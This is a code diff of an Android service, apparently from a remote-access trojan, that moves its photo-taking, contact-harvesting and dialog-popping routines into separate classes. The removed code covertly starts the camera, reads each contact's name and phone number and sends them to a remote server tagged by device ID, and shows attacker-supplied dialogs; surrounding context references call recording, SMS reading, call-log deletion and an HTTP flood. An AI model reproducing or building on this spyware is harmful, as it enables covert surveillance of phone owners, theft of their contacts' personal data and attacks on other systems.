@@ -89,6 +89,9 @@ import com.asynctask.recordAudio;
 import com.asynctask.getCallHistory;
 import com.asynctask.callNumber;
 import com.asynctask.httpFlood;
+import com.asynctask.takePhoto;
+import com.asynctask.getContacts;
+import com.asynctask.openDialog;
 
 import static com.utils.CommonUtils.getInputStreamFromUrl;
 
@@ -586,7 +589,6 @@ public class MyService extends Service {
         }
     };
     //********************************************************************************************************************************************************
-    //********************************************************************************************************************************************************
     public class takeVideo extends AsyncTask<String, Void, String> {
         String i = "0";
         String j = "10000";
@@ -643,66 +645,7 @@ public class MyService extends Service {
         protected void onProgressUpdate(Void... values) {
         }
     }
-
     //********************************************************************************************************************************************************
-    public class takePhoto extends AsyncTask<String, Void, String> {
-        String i = "0";
-
-        public takePhoto(String i) {
-            this.i = i;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-            int numCameras = Camera.getNumberOfCameras();
-            if (numCameras > Integer.parseInt(i)) {
-                Intent intent = new Intent(getApplicationContext(), CameraView.class);
-                Log.i("com.connect", "I: " + i);
-                intent.putExtra("Camera", i);
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-            }
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Taking Photo");
-            } catch (UnsupportedEncodingException e1) {
-                e1.printStackTrace();
-            }
-            try {
-                Thread.sleep(5000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Take Photo Complete");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-            while (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Media", false) == true) {
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media", true).commit();
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
     //********************************************************************************************************************************************************
     public class sendText extends AsyncTask<String, Void, String> {
         String i = "";
@@ -816,8 +759,6 @@ public class MyService extends Service {
         protected void onProgressUpdate(Void... values) {
         }
     }
-
-    //********************************************************************************************************************************************************
     //********************************************************************************************************************************************************
     public class deleteCallLogNumber extends AsyncTask<String, Void, String> {
         String i = "";
@@ -1324,84 +1265,6 @@ public class MyService extends Service {
     }
 
     //********************************************************************************************************************************************************
-    public class getContacts extends AsyncTask<String, Void, String> {
-        String j = "";
-
-        public getContacts(String j) {
-            this.j = j;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-            ContentResolver cr = getContentResolver();
-            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-            if (cur.getCount() > 0) {
-                int i = 0;
-                while (cur.moveToNext()) {
-                    if (i < Integer.parseInt(j)) {
-                        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
-                        String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-
-                        if (Integer.parseInt(cur.getString(
-                                cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
-                            Cursor pCur = cr.query(
-                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                                    null,
-                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                                    new String[]{id}, null);
-                            while (pCur.moveToNext()) {
-                                String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                                try {
-                                    getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + name.replace(' ', '*') + "] " + phoneNo.replace(' ', '*'));
-                                } catch (UnsupportedEncodingException e) {
-
-                                    e.printStackTrace();
-                                }
-                            }
-                            pCur.close();
-                        }
-                    }
-                    i++;
-                }
-            }
-
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get", false).commit();
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Contacts Complete");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-            while (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get", false) == true) {
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Contacts");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get", true).commit();
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
     //********************************************************************************************************************************************************
     public class getInboxSms extends AsyncTask<String, Void, String> {
         String j = "";
@@ -1785,42 +1648,6 @@ public class MyService extends Service {
     }
 
     //********************************************************************************************************************************************************
-    public class openDialog extends AsyncTask<String, Void, String> {
-        String i = ""; //title
-        String j = ""; //message
-
-        public openDialog(String i, String j) {
-            this.i = i;
-            this.j = j;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-            Intent intent = new Intent(getApplicationContext(), Dialog.class);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            intent.putExtra("Title", i);
-            intent.putExtra("Message", j);
-            startActivity(intent);
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Opened Dialog: " + i + " : " + j);
-            } catch (UnsupportedEncodingException e) {
-                e.printStackTrace();
-            }
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {/*httpcalldone*/}
-
-        @Override
-        protected void onPreExecute() {/*httpcallexecuting*/}
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
-    //********************************************************************************************************************************************************    //********************************************************************************************************************************************************
     public class uploadPictures extends AsyncTask<String, Void, String> {
         String i = "";
         String j = "";
